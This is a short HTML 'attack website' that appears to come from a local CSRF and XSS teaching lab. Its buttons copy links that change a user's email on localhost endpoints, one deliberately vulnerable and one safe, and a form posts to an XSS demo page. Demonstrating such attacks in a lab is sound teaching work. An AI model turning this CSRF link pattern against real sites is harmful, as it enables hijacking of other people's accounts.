<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attack website 💀</title>
</head>
<body>
    <ul>
        <label for="email">Email to change:</label>
        <input type="email" id="email" name="email" value="evil.email@mail.com">
        <button type="button" onclick="navigator.clipboard.writeText('http://localhost:8081/CSRF/vulnerable-csrf.php?email=' + document.getElementById('email').value)">Copy hacking link (Vulnerable)</button>
        <button type="button" onclick="navigator.clipboard.writeText('http://localhost:8081/CSRF/safe-csrf.php?email=' + document.getElementById('email').value)">Copy hacking link (Safe)</button>

        <form action="/XSS/xss.php" method="POST">
            <button type="submit">XSS</button>
        </form>
    </ul>
</body>
</html>